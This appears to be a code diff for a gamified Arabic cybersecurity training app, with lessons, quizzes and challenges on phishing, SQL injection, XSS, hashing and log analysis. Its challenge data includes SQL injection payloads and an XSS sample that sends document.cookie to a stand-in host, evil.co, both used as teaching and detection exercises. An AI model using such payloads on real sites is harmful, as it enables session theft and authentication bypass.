+      { q: 'ما هو التصيد (Phishing)؟', opts: ['نوع من الفيروسات', 'خداع المستخدمين للحصول على معلوماتهم', 'جدار حماية', 'برنامج نسخ'], ans: 1 },
+      { q: 'ما عناصر مثلث CIA؟', opts: ['السرعة، الأمان، التكلفة', 'السرية، السلامة، التوافر', 'الشبكة، الخادم، العميل', 'الدخول، الخروج، الحفظ'], ans: 1 }
     ]
   },
-  { id: 'm2', idx: '02', title: 'كلمات المرور والمصادقة', desc: 'إنشاء كلمات مرور قوية والمصادقة الثنائية', icon: '🔐', req: 'm1',
+  { id: 'm2', idx: '02', title: 'كلمات المرور والمصادقة', desc: 'إنشاء كلمات مرور قوية والمصادقة الثنائية', icon: '🔐', req: 'm1', time: '12 د',
     lessons: [
-      { title: 'كلمة المرور القوية', content: 'يجب أن تتكون من 12 حرفاً على الأقل مع أحرف كبيرة وصغيرة وأرقام ورموز.' }
+      { title: 'كلمة المرور القوية', content: 'يجب أن تتكون من 12 حرفاً على الأقل مع مزيج من الأحرف الكبيرة والصغيرة والأرقام والرموز، وتجنّب الكلمات الشائعة أو المعلومات الشخصية.' },
+      { title: 'المصادقة الثنائية (2FA/MFA)', content: 'طبقة حماية إضافية تتطلب عاملاً ثانياً (رمز، تطبيق مصادقة، بصمة) بجانب كلمة المرور، ما يقلل بشدة من فرص الاختراق حتى لو سُرقت كلمة المرور.' },
+      { title: 'مديرو كلمات المرور', content: 'أدوات تولّد وتخزّن كلمات مرور فريدة معقّدة لكل حساب، بدلاً من إعادة استخدام نفس كلمة المرور في كل مكان.' }
     ],
     quiz: [
-      { q: 'الحد الأدنى الموصى به لطول كلمة المرور القوية؟', opts: ['6', '8', '12', '20'], ans: 2 }
+      { q: 'الحد الأدنى الموصى به لطول كلمة المرور القوية؟', opts: ['6', '8', '12', '20'], ans: 2 },
+      { q: 'ما فائدة المصادقة الثنائية؟', opts: ['تسريع تسجيل الدخول', 'طبقة حماية إضافية', 'حفظ كلمة المرور', 'لا فائدة'], ans: 1 }
     ]
   },
-  { id: 'm3', idx: '03', title: 'أساسيات الشبكات', desc: 'بروتوكولات الشبكات والمنافذ', icon: '🌐', req: 'm2',
+  { id: 'm3', idx: '03', title: 'أساسيات الشبكات', desc: 'بروتوكولات الشبكات والمنافذ', icon: '🌐', req: 'm2', time: '14 د',
     lessons: [
-      { title: 'نموذج OSI', content: '7 طبقات: الفيزيائية، ربط البيانات، الشبكة، النقل، الجلسة، العرض، التطبيق.' }
+      { title: 'نموذج OSI', content: '7 طبقات: الفيزيائية، ربط البيانات، الشبكة، النقل، الجلسة، العرض، التطبيق — كل طبقة مسؤولة عن وظيفة محددة في نقل البيانات.' },
+      { title: 'المنافذ الشائعة', content: 'المنفذ 80 (HTTP)، 443 (HTTPS)، 22 (SSH)، 21 (FTP)، 25 (SMTP) — معرفة المنافذ تساعد على فهم حركة الشبكة المشبوهة.' },
+      { title: 'جدار الحماية (Firewall)', content: 'نظام يراقب ويتحكم في حركة الشبكة الواردة والصادرة بناءً على قواعد أمنية محددة مسبقاً.' }
     ],
     quiz: [
-      { q: 'كم عدد طبقات OSI؟', opts: ['5', '6', '7', '8'], ans: 2 }
+      { q: 'كم عدد طبقات OSI؟', opts: ['5', '6', '7', '8'], ans: 2 },
+      { q: 'أي منفذ يُستخدم لـ HTTPS؟', opts: ['80', '21', '443', '25'], ans: 2 }
     ]
   },
-  { id: 'm4', idx: '04', title: 'الاختراق الأخلاقي', desc: 'منهجيات الاختراق الأخلاقي', icon: '🎯', req: 'm3',
+  { id: 'm4', idx: '04', title: 'الاختراق الأخلاقي', desc: 'منهجيات ونطاق الاختراق الأخلاقي', icon: '🎯', req: 'm3', time: '12 د',
     lessons: [
-      { title: 'مراحل اختبار الاختراق', content: 'الاستطلاع، المسح، الاستغلال، الحفاظ على الوصول، تغطية الآثار، كتابة التقرير.' }
+      { title: 'مراحل اختبار الاختراق', content: 'الاستطلاع، المسح، الاستغلال، الحفاظ على الوصول، تغطية الآثار، ثم كتابة التقرير النهائي بالنتائج والتوصيات.' },
+      { title: 'النطاق والإذن القانوني', content: 'أي اختبار اختراق حقيقي يتطلب إذناً كتابياً صريحاً ونطاقاً محدداً مسبقاً؛ الاختراق دون إذن جريمة بصرف النظر عن النية.' }
     ],
     quiz: [
-      { q: 'ما أول مرحلة في اختبار الاختراق؟', opts: ['الاستغلال', 'المسح', 'الاستطلاع', 'التقرير'], ans: 2 }
+      { q: 'ما أول مرحلة في اختبار الاختراق؟', opts: ['الاستغلال', 'المسح', 'الاستطلاع', 'التقرير'], ans: 2 },
+      { q: 'ما الشرط الأساسي لأي اختبار اختراق قانوني؟', opts: ['خبرة 5 سنوات', 'إذن كتابي ونطاق محدد', 'استخدام أدوات مدفوعة', 'لا يوجد شرط'], ans: 1 }
     ]
   },
-  { id: 'm5', idx: '05', title: 'الهجمات الشائعة', desc: 'حقن SQL والتصيد وتحليل السجلات', icon: '⚔️', req: 'm4',
+  { id: 'm5', idx: '05', title: 'هجمات الويب الشائعة', desc: 'حقن SQL وXSS وتحليل السجلات', icon: '⚔️', req: 'm4', time: '16 د',
     lessons: [
-      { title: 'حقن SQL', content: 'إدخال استعلامات ضارة في حقول الإدخال لتجاوز المصادقة أو استخراج البيانات.' }
+      { title: 'حقن SQL', content: 'إدخال استعلامات ضارة في حقول الإدخال لتجاوز المصادقة أو استخراج البيانات؛ الحل الأمثل هو استخدام Prepared Statements بدلاً من دمج المدخلات مباشرة في الاستعلام.' },
+      { title: 'البرمجة النصية عبر المواقع (XSS)', content: 'حقن كود JavaScript ضار في صفحة يعرضها مستخدمون آخرون، غالباً عبر حقول تعليقات أو بحث لا يتم تنظيفها (sanitize) قبل عرضها.' }
     ],
     quiz: [
-      { q: 'أفضل حماية من حقن SQL؟', opts: ['كلمة مرور قوية', 'prepared statements', 'مضاد فيروسات', 'إغلاق المنفذ 80'], ans: 1 }
+      { q: 'أفضل حماية من حقن SQL؟', opts: ['كلمة مرور قوية', 'Prepared Statements', 'مضاد فيروسات', 'إغلاق المنفذ 80'], ans: 1 },
+      { q: 'أين يظهر هجوم XSS غالباً؟', opts: ['في قاعدة البيانات مباشرة', 'حقول إدخال تُعرض دون تنظيف', 'كابل الشبكة', 'ذاكرة المعالج'], ans: 1 }
+    ]
+  },
+  { id: 'm6', idx: '06', title: 'البرمجيات الخبيثة والهندسة الاجتماعية', desc: 'أنواع البرمجيات الخبيثة وأساليب الخداع البشري', icon: '🦠', req: 'm5', time: '13 د',
+    lessons: [
+      { title: 'أنواع البرمجيات الخبيثة', content: 'الفيروسات، الديدان، أحصنة طروادة، برامج الفدية (Ransomware)، برامج التجسس — لكل نوع طريقة انتشار وضرر مختلفة.' },
+      { title: 'الهندسة الاجتماعية', content: 'استغلال الثقة والعواطف البشرية بدلاً من الثغرات التقنية، مثل انتحال شخصية موظف دعم فني أو خلق شعور بالإلحاح لدفع الضحية لاتخاذ قرار متسرع.' }
+    ],
+    quiz: [
+      { q: 'ما الذي يشفّر ملفات الضحية ويطلب فدية؟', opts: ['دودة', 'برنامج فدية', 'حصان طروادة', 'جدار حماية'], ans: 1 },
+      { q: 'الهندسة الاجتماعية تستغل بشكل أساسي؟', opts: ['ثغرات البرمجيات', 'ثقة وسلوك الإنسان', 'ضعف الشبكة', 'المنافذ المفتوحة'], ans: 1 }
+    ]
+  },
+  { id: 'm7', idx: '07', title: 'أساسيات التشفير', desc: 'التجزئة والتشفير المتماثل وغير المتماثل', icon: '🧬', req: 'm6', time: '15 د',
+    lessons: [
+      { title: 'دوال التجزئة (Hashing)', content: 'تحويل بيانات بأي حجم إلى بصمة ثابتة الطول (مثل MD5 32 حرفاً، SHA-256 64 حرفاً)؛ تُستخدم للتحقق من سلامة البيانات وتخزين كلمات المرور بأمان.' },
+      { title: 'التشفير المتماثل وغير المتماثل', content: 'المتماثل يستخدم مفتاحاً واحداً للتشفير وفك التشفير (سريع)، بينما غير المتماثل يستخدم زوج مفاتيح عام وخاص (أبطأ لكن أكثر أماناً لتبادل المفاتيح).' }
+    ],
+    quiz: [
+      { q: 'كم طول التجزئة الناتجة عن MD5 (بالأحرف السداسية عشرية)؟', opts: ['16', '32', '64', '128'], ans: 1 },
+      { q: 'التشفير غير المتماثل يستخدم؟', opts: ['مفتاحاً واحداً', 'زوج مفاتيح عام وخاص', 'لا مفاتيح', 'كلمة مرور فقط'], ans: 1 }
+    ]
+  },
+  { id: 'm8', idx: '08', title: 'الاستجابة للحوادث', desc: 'خطوات التعامل مع حادثة أمنية والتبليغ عنها', icon: '🚨', req: 'm7', time: '11 د',
+    lessons: [
+      { title: 'دورة الاستجابة للحوادث', content: 'التحضير، الاكتشاف والتحليل، الاحتواء، الاستئصال، التعافي، ثم الدروس المستفادة — دورة متكررة تُحسّن الجاهزية مع كل حادثة.' },
+      { title: 'التبليغ الصحيح', content: 'توثيق الوقت والنطاق والدليل فور اكتشاف أي نشاط مشبوه، وإبلاغ الجهة المختصة دون محاولة "إصلاح" الأمر بمفردك أولاً لتجنّب فقدان أدلة رقمية.' }
+    ],
+    quiz: [
+      { q: 'ما أول خطوة منطقية بعد اكتشاف حادثة أمنية نشطة؟', opts: ['حذف كل السجلات', 'الاحتواء لمنع انتشار الضرر', 'تجاهلها', 'إعادة تشغيل كل الأجهزة فوراً'], ans: 1 },
+      { q: 'لماذا نوثّق الدليل قبل التدخل؟', opts: ['لإضاعة الوقت', 'لعدم فقدان دليل رقمي مهم', 'لا داعي للتوثيق', 'لتحميل الملفات'], ans: 1 }
     ]
   }
 ];
 
 const CHALLENGES_DATA = [
-  { id: 'ch1', title: 'فك التشفير', desc: 'فك تشفير Base64', icon: '🔓', xp: 50, type: 'decode', req: 'm1',
-    data: { cipher: 'Q2xlYXJhbmNlIFplcm8=', answer: 'Clearance Zero', hints: ['إنه Base64'] }
-  },
-  { id: 'ch2', title: 'تحليل بريد', desc: 'اكتشف التصيد الاحتيالي', icon: '📧', xp: 75, type: 'phishing', req: 'm2',
-    data: { from: 'bank@alert.co', subject: 'تنبيه عاجل', body: 'رابط: http://verify.tk', flags: ['رابط .tk', 'طلب عاجل'], isPhish: true }
-  },
-  { id: 'ch3', title: 'محاكاة طرفية', desc: 'استخدم الأوامر', icon: '💻', xp: 100, type: 'terminal', req: 'm3',
-    data: { cmds: { 'ls': '.secret', 'cat .secret': 'CLEARANCE{flag}' }, flag: 'CLEARANCE{flag}' }
-  },
-  { id: 'ch4', title: 'قوة كلمة المرور', desc: 'اختبر قوة كلمة مرور', icon: '🔑', xp: 60, type: 'password', req: 'm2', data: {} },
-  { id: 'ch5', title: 'حقن SQL', desc: 'تجاوز نموذج الدخول', icon: '💉', xp: 150, type: 'sqli', req: 'm5',
-    data: { payloads: ["' OR 1=1 --", "' OR '1'='1"] }
-  },
-  { id: 'ch6', title: 'تحليل السجلات', desc: 'اكتشف الاختراق', icon: '📋', xp: 120, type: 'log', req: 'm5',
+  { id: 'ch1', title: 'فك التشفير', desc: 'فك تشفير Base64', icon: '🔓', xp: 50, diff: 'easy', time: '3 د', type: 'decode', req: 'm1',
+    data: { cipher: 'Q2xlYXJhbmNlIFplcm8=', answer: 'Clearance Zero', hints: ['هذا الترميز شائع جداً في الويب: Base64.'] } },
+  { id: 'ch4', title: 'قوة كلمة المرور', desc: 'ابنِ كلمة مرور قوية بالكامل', icon: '🔑', xp: 60, diff: 'easy', time: '3 د', type: 'password', req: 'm2', data: {} },
+  { id: 'ch2', title: 'تحليل بريد', desc: 'اكتشف التصيد الاحتيالي', icon: '📧', xp: 75, diff: 'easy', time: '4 د', type: 'phishing', req: 'm2',
+    data: { from: 'bank-support@alert-secure.tk', subject: 'تنبيه عاجل: حسابك سيُغلق خلال 24 ساعة!', body: 'عزيزي العميل،\n\nرصدنا نشاطاً غير معتاد على حسابك. يرجى تسجيل الدخول فوراً عبر الرابط التالي لتفادي إيقاف الحساب:\nhttp://secure-bank-verify.tk/login\n\nإدارة الأمان', flags: ['نطاق .tk مجاني ومريب', 'استعجال وتهديد بإغلاق الحساب', 'رابط غير رسمي للبنك'], isPhish: true } },
+  { id: 'ch3', title: 'محاكاة طرفية', desc: 'استخدم الأوامر لإيجاد العلم', icon: '💻', xp: 100, diff: 'medium', time: '5 د', type: 'terminal', req: 'm3',
+    data: { cmds: { 'ls': '.secret  notes.txt', 'cat .secret': 'CLEARANCE{term1n4l_m4st3r}' }, flag: 'CLEARANCE{term1n4l_m4st3r}' } },
+  { id: 'ch5', title: 'حقن SQL', desc: 'تجاوز نموذج الدخول', icon: '💉', xp: 150, diff: 'hard', time: '6 د', type: 'sqli', req: 'm5',
+    data: { payloads: ["' OR 1=1 --", "' OR '1'='1"] } },
+  { id: 'ch7', title: 'اصطياد XSS', desc: 'حدّد الحقل المعرّض لهجوم XSS', icon: '🕷️', xp: 90, diff: 'medium', time: '4 د', type: 'xss', req: 'm5',
+    data: { fields: [
+      { label: 'حقل التعليقات', code: "<" + "script>document.location='http://evil.co?c='+document.cookie</" + "script>", vulnerable: true },
+      { label: 'حقل السعر (رقمي)', code: "129.99", vulnerable: false },
+      { label: 'رابط صورة المنتج', code: "https://cdn.shop.com/img/42.png", vulnerable: false }
+    ] } },
+  { id: 'ch6', title: 'تحليل السجلات', desc: 'اكتشف محاولات الاختراق', icon: '📋', xp: 120, diff: 'medium', time: '5 د', type: 'log', req: 'm5',
     data: { logs: [
-      { text: 'GET /index.html', sus: false },
-      { text: "GET /admin?user=' OR 1=1 --", sus: true },
-      { text: 'GET /logout', sus: false }
-    ]}
-  }
+      { text: '203.0.113.4 GET /index.html 200', sus: false },
+      { text: "198.51.100.9 GET /admin?user=' OR 1=1 -- 200", sus: true },
+      { text: '203.0.113.4 GET /logout 200', sus: false },
+      { text: '198.51.100.9 POST /login user=admin&pass=admin 401', sus: true },
+      { text: '203.0.113.4 GET /style.css 200', sus: false }
+    ] } },
+  { id: 'ch8', title: 'تحديد نوع التجزئة', desc: 'ميّز بين خوارزميات التجزئة', icon: '🧩', xp: 70, diff: 'easy', time: '3 د', type: 'hash', req: 'm7',
+    data: { hash: '5f4dcc3b5aa765d61d8327deb882cf99', options: ['MD5', 'SHA-1', 'SHA-256', 'bcrypt'], answer: 'MD5', hints: ['32 حرفاً سداسي عشري = 128 بت.'] } },
+  { id: 'ch9', title: 'مطاردة العلم النهائي', desc: 'فكّ ROT13 للحصول على العلم', icon: '🏁', xp: 130, diff: 'hard', time: '5 د', type: 'decode', req: 'm8',
+    data: { cipher: 'PYRNENAPR{sha4y_pyrnenapr_tenagrq}', answer: 'CLEARANCE{final_clearance_granted}', hints: ['ROT13: أزح كل حرف 13 خطوة في الأبجدية الإنجليزية.'] } }
 ];
 
 const BADGES_DATA = [
@@ -1542,7 +796,11 @@ const BADGES_DATA = [
   { id: 'b4', name: 'صائد التصيد', icon: '📧', cond: () => userProgress?.completedChallenges.includes('ch2') },
   { id: 'b5', name: 'محارب الطرفية', icon: '💻', cond: () => userProgress?.completedChallenges.includes('ch3') },
   { id: 'b6', name: 'مخترق قواعد', icon: '💉', cond: () => userProgress?.completedChallenges.includes('ch5') },
-  { id: 'b7', name: 'محقق السجلات', icon: '📋', cond: () => userProgress?.completedChallenges.includes('ch6') }
+  { id: 'b7', name: 'محقق السجلات', icon: '📋', cond: () => userProgress?.completedChallenges.includes('ch6') },
+  { id: 'b8', name: 'صياد XSS', icon: '🕷️', cond: () => userProgress?.completedChallenges.includes('ch7') },
+  { id: 'b9', name: 'محلل التجزئة', icon: '🧩', cond: () => userProgress?.completedChallenges.includes('ch8') },
+  { id: 'b10', name: 'تصريح كامل', icon: '🏅', cond: () => userProgress?.completedModules.length === MODULES_DATA.length },
+  { id: 'b11', name: 'مثابر', icon: '🔥', cond: () => (userProgress?.streak || 0) >= 3 }
 ];
 
 // ==================== LANGUAGE ====================
@@ -1566,6 +824,16 @@ function getSavedUser() { return localStorage.getItem(CURRENT_USER_KEY); }
 function setSavedUser(u) { localStorage.setItem(CURRENT_USER_KEY, u); }
 function clearSavedUser() { localStorage.removeItem(CURRENT_USER_KEY); }
 
+function todayStr() { return new Date().toISOString().slice(0, 10); }
+function applyStreak(progress) {
+  const today = todayStr();
+  if (progress.lastLoginDate === today) return;
+  const y = new Date(); y.setDate(y.getDate() - 1);
+  const yesterday = y.toISOString().slice(0, 10);
+  progress.streak = (progress.lastLoginDate === yesterday) ? (progress.streak || 0) + 1 : 1;
+  progress.lastLoginDate = today;
+}
+
 function login(username, password) {
   const users = getUsers();
   if (!username || !password) return { error: t('login_error_empty') };
@@ -1573,7 +841,10 @@ function login(username, password) {
   if (users[username].password !== password) return { error: t('login_error_pass') };
   setSavedUser(username);
   currentUser = username;
-  userProgress = users[username].progress || { completedModules: [], completedQuizzes: {}, completedChallenges: [], earnedBadges: [], bossCompleted: false, xp: 0 };
+  userProgress = Object.assign(DEFAULT_PROGRESS(), users[username].progress || {});
+  applyStreak(userProgress);
+  users[username].progress = userProgress;
+  saveUsers(users);
   return { success: true };
 }
 
@@ -1582,7 +853,7 @@ function register(username, password, confirm) {
   if (password !== confirm) return { error: t('reg_error_match') };
   const users = getUsers();
   if (users[username]) return { error: t('reg_error_exists') };
-  users[username] = { password, progress: { completedModules: [], completedQuizzes: {}, completedChallenges: [], earnedBadges: [], bossCompleted: false, xp: 0 } };
+  users[username] = { password, progress: DEFAULT_PROGRESS() };
   saveUsers(users);
   return { success: true };
 }
@@ -1591,21 +862,22 @@ function logout() {
   clearSavedUser();
   currentUser = null;
   userProgress = null;
+  if (matrixTimer) { clearInterval(matrixTimer); matrixTimer = null; }
   document.getElementById('authScreen').classList.remove('hidden');
   document.getElementById('bootScreen').classList.remove('fade-out');
   document.querySelectorAll('#loginUser, #loginPass, #regUser, #regPass, #regConfirm').forEach(el => el.value = '');
   document.getElementById('loginError').textContent = '';
   document.getElementById('regError').textContent = '';
   document.getElementById('view').innerHTML = '';
+  document.querySelectorAll('.auth-tab').forEach(tb => tb.classList.toggle('active', tb.dataset.tab === 'login'));
+  document.getElementById('loginForm').style.display = 'block';
+  document.getElementById('registerForm').style.display = 'none';
 }
 
 function saveProgress() {
   if (!currentUser || !userProgress) return;
   const users = getUsers();
-  if (users[currentUser]) {
-    users[currentUser].progress = userProgress;
-    saveUsers(users);
-  }
+  if (users[currentUser]) { users[currentUser].progress = userProgress; saveUsers(users); }
 }
 
 // ==================== HELPERS ====================
@@ -1620,10 +892,10 @@ function showToast(msg) {
 
 function addXP(amount) {
   if (!userProgress) return;
-  userProgress.xp += amount;
+  userProgress.xp = Math.max(0, userProgress.xp + amount);
   saveProgress();
   updateAllUI();
-  showToast(`+${amount} XP`);
+  if (amount > 0) showToast(`+${amount} XP`);
 }
 
 function completeModule(id) {
@@ -1647,6 +919,14 @@ function completeChallenge(id) {
   saveProgress();
   checkBadges();
 }
+function useHint(challengeId) {
+  if (!userProgress) return false;
+  if (!userProgress.hintsUsed[challengeId]) {
+    userProgress.hintsUsed[challengeId] = true;
+    addXP(-10);
+  }
+  return true;
+}
 function checkBadges() {
   let changed = false;
   BADGES_DATA.forEach(b => {
@@ -1666,6 +946,7 @@ function isChallengeUnlocked(id) {
   const ch = CHALLENGES_DATA.find(c => c.id === id);
   return ch && (!ch.req || userProgress?.completedModules.includes(ch.req));
 }
+function diffTag(diff) { return `<span class="diff-tag diff-${diff}">${t(diff)}</span>`; }
 
 function updateAllUI() {
   updateTopBar();
@@ -1677,15 +958,15 @@ function updateAllUI() {
     const navMap = {
       'home': renderHome, 'module': () => renderModule(view.dataset.moduleId),
       'challenges': renderChallengesHub, 'challenge': () => renderChallenge(view.dataset.challengeId),
-      'badges': renderBadges
+      'badges': renderBadges, 'leaderboard': renderLeaderboard
     };
     if (navMap[currentView]) navMap[currentView]();
   }
 }
 
 function updateTopBar() {
-  document.getElementById('topLevel').textContent = userProgress ? Math.floor(userProgress.xp / 200) + 1 : 1;
   document.getElementById('topXP').textContent = userProgress?.xp || 0;
+  document.getElementById('topStreak').textContent = userProgress?.streak || 0;
   document.getElementById('userNameDisplay').textContent = currentUser || 'زائر';
   document.getElementById('userAvatar').textContent = (currentUser || 'ز')[0].toUpperCase();
 }
@@ -1696,7 +977,12 @@ function updateProgressUI() {
   const pct = total ? Math.round((completed / total) * 100) : 0;
   document.getElementById('progressPct').textContent = pct + '%';
   document.getElementById('overallProgressFill').style.width = pct + '%';
-  document.getElementById('levelLine').textContent = `LV.${Math.floor((userProgress?.xp || 0) / 200) + 1} // ${t('progress')}`;
+  document.getElementById('levelLine').textContent = `${completed}/${total} ${t('modules')}`;
+  const xp = userProgress?.xp || 0;
+  const rankIdx = getRankIndex(xp);
+  document.getElementById('rankName').textContent = rankLabel(rankIdx);
+  const next = CLEARANCE_RANKS[rankIdx + 1];
+  document.getElementById('rankNext').textContent = next ? `${next.min - xp} XP ${t('rank_next')}` : t('max_rank');
 }
 
 function navigateTo(view, param) {
@@ -1709,6 +995,7 @@ function navigateTo(view, param) {
     case 'challenges': renderChallengesHub(); break;
     case 'challenge': renderChallenge(param); break;
     case 'badges': renderBadges(); break;
+    case 'leaderboard': renderLeaderboard(); break;
     default: renderHome();
   }
   renderSideNav();
@@ -1716,6 +1003,7 @@ function navigateTo(view, param) {
   const active = document.querySelector(`.bottom-nav-item[data-nav="${view}"]`);
   if (active) active.classList.add('active');
   closeSideNav();
+  window.scrollTo(0, 0);
 }
 
 function renderSideNav() {
@@ -1744,13 +1032,17 @@ function renderHome() {
   const done = userProgress?.completedModules.length || 0;
   const challDone = userProgress?.completedChallenges.length || 0;
   const badgeCount = userProgress?.earnedBadges.length || 0;
+  const rankIdx = getRankIndex(userProgress?.xp || 0);
+  const allDone = done === MODULES_DATA.length;
   v.innerHTML = `
+    ${allDone ? `<div class="cert-banner"><span class="t">${t('all_modules_done')}</span><span class="tag gold">🏅 ${rankLabel(rankIdx)}</span></div>` : ''}
     <div class="hero-panel">
       <h1 class="hero-h1">Clearance <span class="zero">Zero</span></h1>
       <p class="hero-desc">${t('auth_subtitle')}</p>
+      <div class="hero-rank-row"><span class="tag ok">⌁ ${rankLabel(rankIdx)}</span><span class="tag streak-tag">🔥 ${userProgress?.streak || 0} ${t('streak')}</span></div>
       <div class="hero-stats-row">
         <div class="mini-stat"><div class="num">${done}/${MODULES_DATA.length}</div><div class="lbl">${t('modules')}</div></div>
-        <div class="mini-stat"><div class="num">${challDone}</div><div class="lbl">${t('challenges')}</div></div>
+        <div class="mini-stat"><div class="num">${challDone}/${CHALLENGES_DATA.length}</div><div class="lbl">${t('challenges')}</div></div>
         <div class="mini-stat"><div class="num">${badgeCount}</div><div class="lbl">${t('badges')}</div></div>
         <div class="mini-stat"><div class="num">${userProgress?.xp || 0}</div><div class="lbl">XP</div></div>
       </div>
@@ -1762,7 +1054,9 @@ function renderHome() {
       return `<div class="module-card ${done ? '' : unlocked ? 'clickable' : 'locked'}" data-module="${m.id}">
         <div class="module-card-top"><span class="module-card-idx">${m.idx}</span><span class="module-card-icon">${m.icon}</span></div>
         <h3>${m.title}</h3><p>${m.desc}</p>
-        ${done ? '<span class="tag ok">✓ ' + t('completed') + '</span>' : (!unlocked ? '<span class="tag locked">🔒 ' + t('locked') + '</span>' : '')}
+        <div class="module-card-meta">
+          ${done ? '<span class="tag ok">✓ ' + t('completed') + '</span>' : (!unlocked ? '<span class="tag locked">🔒 ' + t('locked') + '</span>' : '<span class="tag">⏱ ' + m.time + '</span>')}
+        </div>
       </div>`;
     }).join('')}</div>`;
   v.querySelectorAll('.module-card.clickable').forEach(c => c.addEventListener('click', () => navigateTo('module', c.dataset.module)));
@@ -1774,7 +1068,7 @@ function renderModule(id) {
   const v = document.getElementById('view');
   const quizDone = userProgress?.completedQuizzes[id];
   v.innerHTML = `
-    <div class="file-chrome"><span class="path">modules/${mod.idx}_${mod.id}</span></div>
+    <div class="file-chrome"><span class="path">modules/${mod.idx}_${mod.id}</span><span>·</span><span>${mod.time}</span></div>
     <div class="module-head"><h1>${mod.icon} ${mod.title}</h1><p class="desc">${mod.desc}</p></div>
     ${mod.lessons.map(l => `<div class="panel" style="padding:14px;margin-bottom:12px;"><h3>📖 ${l.title}</h3><p>${l.content}</p></div>`).join('')}
     <div id="quizArea">${quizDone ? '<div class="panel" style="text-align:center;padding:20px;">✅ ' + t('completed') + '</div>' :
@@ -1788,7 +1082,7 @@ function startQuiz(mod) {
   function show() {
     if (idx >= mod.quiz.length) { showResult(); return; }
     const q = mod.quiz[idx];
-    area.innerHTML = `<div class="quiz-q"><div class="quiz-q-text">${q.q}</div>${q.opts.map((o,i) => `<div class="quiz-opt" data-idx="${i}">${o}</div>`).join('')}</div>`;
+    area.innerHTML = `<div class="quiz-q"><div class="quiz-q-text" style="margin-bottom:10px;">${q.q}</div>${q.opts.map((o,i) => `<div class="quiz-opt" data-idx="${i}">${o}</div>`).join('')}</div>`;
     area.querySelectorAll('.quiz-opt').forEach(o => o.addEventListener('click', function() {
       if (this.dataset.done) return;
       area.querySelectorAll('.quiz-opt').forEach(el => el.dataset.done = '1');
@@ -1812,19 +1106,25 @@ function startQuiz(mod) {
   show();
 }
 
-function renderChallengesHub() {
+function renderChallengesHub(filter) {
+  filter = filter || 'all';
   const v = document.getElementById('view');
+  const filters = ['all', 'easy', 'medium', 'hard'];
   v.innerHTML = `<div class="module-head"><h1>⚡ ${t('challenges')}</h1></div>
-    <div class="challenge-grid">${CHALLENGES_DATA.map(c => {
+    <div class="challenge-toolbar">${filters.map(f => `<button class="filter-chip ${f === filter ? 'active' : ''}" data-f="${f}">${f === 'all' ? t('all') : t(f)}</button>`).join('')}</div>
+    <div class="challenge-grid">${CHALLENGES_DATA.filter(c => filter === 'all' || c.diff === filter).map(c => {
       const done = userProgress?.completedChallenges.includes(c.id);
       const unlocked = isChallengeUnlocked(c.id);
       return `<div class="challenge-card ${done ? '' : unlocked ? 'clickable' : 'locked'}" data-ch="${c.id}">
-        <div class="top-row"><span class="ico">${c.icon}</span><span class="pts">${c.xp}XP</span></div>
+        <div class="top-row"><span class="ico">${c.icon}</span><span class="pts">${c.xp} ${t('xp_short')}</span></div>
         <h3>${c.title}</h3><p>${c.desc}</p>
-        ${done ? '<span class="tag ok">✓</span>' : (!unlocked ? '<span class="tag locked">🔒</span>' : '')}
+        <div class="meta-row">
+          ${done ? '<span class="tag ok">✓</span>' : (!unlocked ? '<span class="tag locked">🔒</span>' : diffTag(c.diff) + '<span class="tag">⏱ ' + c.time + '</span>')}
+        </div>
       </div>`;
     }).join('')}</div>`;
   v.querySelectorAll('.challenge-card.clickable').forEach(c => c.addEventListener('click', () => navigateTo('challenge', c.dataset.ch)));
+  v.querySelectorAll('.filter-chip').forEach(f => f.addEventListener('click', () => renderChallengesHub(f.dataset.f)));
 }
 
 function renderChallenge(id) {
@@ -1832,24 +1132,45 @@ function renderChallenge(id) {
   if (!ch) return navigateTo('challenges');
   const v = document.getElementById('view');
   const done = userProgress?.completedChallenges.includes(id);
-  let html = `<div class="module-head"><h1>${ch.icon} ${ch.title}</h1></div>`;
+  let html = `<div class="module-head"><h1>${ch.icon} ${ch.title}</h1><p class="desc">${ch.desc}</p></div>`;
   if (done) { html += '<div class="panel" style="text-align:center;padding:20px;">✅ ' + t('completed') + '</div>'; v.innerHTML = html; return; }
   switch(ch.type) {
-    case 'decode': html += `<div class="panel"><div class="cipher-text">${ch.data.cipher}</div>
-      <input class="field-input" id="decInput" placeholder="${t('decode')}..." style="width:100%;padding:10px;background:var(--void-2);border:1px solid var(--line);border-radius:var(--radius);color:var(--paper);margin-bottom:8px;">
-      <button class="btn btn-cyan btn-sm" id="decCheck">✓</button>
-      <button class="btn btn-ghost btn-sm" id="decHint">💡</button><p id="decHintText" style="display:none;color:var(--cyan);margin-top:8px;"></p></div>`; break;
-    case 'phishing': html += `<div class="mail-card"><div class="mail-head"><strong>${ch.data.from}</strong><br>${ch.data.subject}</div>
-      <div class="mail-body">${ch.data.body}</div><div style="padding:12px;display:flex;gap:8px;"><button class="btn btn-danger btn-sm" id="phishYes">⚠️ ${t('correct')}</button>
-      <button class="btn btn-ghost btn-sm" id="phishNo">✓ ${t('wrong')}</button></div></div>`; break;
-    case 'terminal': html += `<div class="term-window"><div class="term-body" id="termBody"><div>guest@cz:~$</div></div>
-      <div class="term-inputrow"><span class="term-prompt">$</span><input class="term-input" id="termInput" placeholder="command..."></div></div>`; break;
-    case 'password': html += `<div class="panel"><input class="pw-input" id="pwInput" placeholder="${t('password')}..." style="width:100%;padding:10px;background:var(--void-2);border:1px solid var(--line);border-radius:var(--radius);color:var(--paper);">
-      <div class="progress-bar" style="margin-top:8px;"><div class="progress-fill" id="pwFill" style="width:0%;"></div></div><p id="pwVerdict"></p><button class="btn btn-cyan btn-sm" id="pwComplete" style="display:none;">${t('finish')}</button></div>`; break;
-    case 'sqli': html += `<div class="panel"><p>Username: admin</p><input id="sqliPass" placeholder="Payload..." style="width:100%;padding:10px;background:var(--void-2);border:1px solid var(--line);border-radius:var(--radius);color:var(--paper);margin-top:8px;">
-      <button class="btn btn-cyan btn-sm" id="sqliLogin" style="margin-top:8px;">Login</button></div>`; break;
-    case 'log': html += `<div class="panel">${ch.data.logs.map((l,i) => `<div class="log-line" data-idx="${i}" style="padding:8px;cursor:pointer;font-family:var(--font-mono);font-size:12px;border-bottom:1px solid var(--line);">${l.text}</div>`).join('')}
-      </div><button class="btn btn-cyan btn-sm" id="logCheck" style="margin-top:8px;">✓</button>`; break;
+    case 'decode':
+      html += `<div class="panel" style="padding:16px;"><div class="cipher-text">${ch.data.cipher}</div>
+        <input class="text-input" id="decInput" placeholder="${t('decode')}...">
+        <button class="btn btn-cyan btn-sm" id="decCheck">${t('check')}</button>
